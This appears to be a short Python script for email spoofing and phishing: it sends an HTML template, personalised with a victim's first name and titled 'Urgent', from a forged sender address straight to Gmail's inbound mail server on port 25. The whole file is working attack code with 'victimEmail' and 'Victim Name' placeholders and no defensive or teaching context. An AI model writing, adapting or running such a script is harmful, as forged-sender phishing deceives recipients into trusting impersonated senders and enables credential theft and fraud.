from smtplib import SMTP
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

RECEIVER = "victimEmail"
RECEIVER_NAME = "Victim Name"
FROMADDR = "Name <spoofed@domain.com>"
SMTP_SERVER = "gmail-smtp-in.l.google.com"

msg = MIMEMultipart()
msg["Subject"] = "Urgent"
msg["From"] = FROMADDR

with open("template.html", "r") as file:
    message = file.read().replace("\n", "")
    message = message.replace("{{FirstName}}", RECEIVER_NAME)
    msg.attach(MIMEText(message, "html"))

    with SMTP(SMTP_SERVER, 25) as smtp:
        smtp.starttls()
        smtp.sendmail(FROMADDR, RECEIVER, msg.as_string())